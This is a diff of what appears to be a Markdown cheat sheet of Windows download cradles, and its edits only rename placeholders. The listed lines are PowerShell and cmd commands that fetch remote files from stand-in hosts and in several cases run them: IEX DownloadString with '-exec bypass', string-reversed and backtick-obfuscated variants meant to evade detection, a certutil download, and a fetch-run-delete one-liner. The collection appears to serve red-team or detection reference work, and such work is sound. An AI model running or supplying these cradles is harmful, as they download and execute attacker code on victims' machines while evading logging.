@@ -277,14 +277,14 @@ powershell.exe -exec bypass -C IEX ((new-object net.webclient).downloadstring('h
 powershell.exe -exec bypass -C IEX ((new-object net.tneilCbeW).daolnwoDstring('http[:]//<url>/file.ext'))
 powershell.exe -exec bypass -C IN`V`o`Ke-eXp`ResSIOn (Ne`W-ob`ject Net.WebClient).DownloadString('http[:]//<url>/file.ext'))
 powershell.exe Invoke-WebRequest -Uri "https[:]//<url>/file.ext" -OutFile c:\file.ext -UseBasicParsing"
-powershell.exe iwr -Uri "https[:]//<url>/file.ext" -OutFile c:\file.ext -UseBasicParsing"
-сmd.exe /c PowerShell iwr -Uri http://<ip_address>:<port>/file.ext -OutFile c:\file.ext -UseBasicParsing
+powershell.exe iwr -Uri "https[:]//<url>/file.ext" -OutFile c:\<output_file>.ext -UseBasicParsing"
+сmd.exe /c PowerShell iwr -Uri http://<IP_address>:<port>/<file_name>.ext -OutFile c:\<output_file>.ext -UseBasicParsing
 PowerShell -Command $wc = New-Object System.Net.WebClient; $tempfile = [System.
 IO.Path]::GetTempFileName(); $tempfile += '.<ext>'; $wc.DownloadFile('[URL]', $tempfile); & 
 $tempfile ; Remove-Item -Force $tempfile
-powershell.exe -exec bypass -C Invoke-WebRequest "http:/<ip_address>:<port>/file.ext" -OutFile "file.ext"
-powershell.exe -C wget "http[:]//<ip_address>:<port>/file.ext" -OutFile "file.ext"
-cmd.exe /c certutil -urlcache -split -f hxxp[:]//<ip_address>:<port>/file.ext $path\to\outfile\outfile.ext
+powershell.exe -exec bypass -C Invoke-WebRequest "http:/<IP_address>:<port>/<file_name>.ext" -OutFile "<output_file>.ext"
+powershell.exe -C wget "http[:]//<IP_address>:<port>/<file_name>.ext" -OutFile "<output_file>.ext"
+cmd.exe /c certutil -urlcache -split -f hxxp[:]//<IP_address>:<port>/<file_name>.ext $path\to\outfile\<output_file>.ext
 ```
 <br>
 
